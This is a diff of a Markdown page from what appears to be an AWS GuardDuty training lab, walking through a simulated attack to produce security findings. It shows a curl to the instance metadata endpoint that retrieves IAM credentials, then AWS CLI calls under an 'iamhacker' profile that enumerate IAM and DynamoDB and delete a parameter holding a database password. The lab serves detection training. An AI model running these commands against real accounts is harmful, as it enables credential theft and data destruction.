@@ -16,12 +16,18 @@ To perform this final attack, Bao needs to successfully retrieve the temporary I
 
 > We will proceed to create the Findings
 1. Access the Session Manager at ap-southeast-1.
+
 ![create findings](/images/3.attack/3.3/1.png)
+
 2. In the right hand navigation bar, select **Start Session**.
+
 ![create findings](/images/3.attack/3.3/2.png)
+
 3. In the **Target instances** section we will see a managed EC2 instance with the following name format - **GuardDuty-Example: Compromised Instance: Scenario 3** with SSM Agent ping status as Online.
-4. Select instance **GuardDuty-Example: Compromised Instance: Scenario 3** and press **Start session**
+4. Select instance **GuardDuty-Example: Compromised Instance: Scenario 3** and press **Start session**.
+
 ![create findings](/images/3.attack/3.3/3.png)
+
 5. Execute the Metadata query statement:
 
          curl http://169.254.169.254/latest/meta-data/iam/security-credentials/GuardDuty-Example-EC2-Compromised
@@ -30,6 +36,7 @@ To perform this final attack, Bao needs to successfully retrieve the temporary I
 - Access Key ID
 - Secret Access Key
 - Session Token
+
 ![create findings](/images/3.attack/3.3/4.png)
 
 ### Create AWS CLI Profile on your PC
@@ -55,6 +62,7 @@ Using the AWS CLI commands below, we make API calls to different AWS services.
       aws iam create-user --user-name BuiChiBao --profile iamhacker
 
 ![create findings](/images/3.attack/3.4/2.png)
+
 > So IAM user can not get-user nor create-user
 
 **Is there access to DynamoDB?**
@@ -63,6 +71,7 @@ Using the AWS CLI commands below, we make API calls to different AWS services.
       aws dynamodb describe-table --table-name GuardDuty-Example-Customer-DB --profile iamhacker
 
 ![create findings](/images/3.attack/3.4/3.png)
+
 ![create findings](/images/3.attack/3.4/4.png)
 **Is there any access to DynamoDB data?**
 
@@ -71,6 +80,7 @@ Using the AWS CLI commands below, we make API calls to different AWS services.
       aws dynamodb list-tables --profile iamhacker
 
 ![create findings](/images/3.attack/3.4/5.png)
+
 ![create findings](/images/3.attack/3.4/6.png)
 
 > This way the hacker has access and can query data to DynamoDB.
@@ -83,4 +93,5 @@ Using the AWS CLI commands below, we make API calls to different AWS services.
       aws ssm delete-parameter --name "gd_prod_dbpwd_sample" --profile iamhacker
 
 ![create findings](/images/3.attack/3.4/7.png)
+
 > This gives the hacker access to the System Manager Parameter Store.
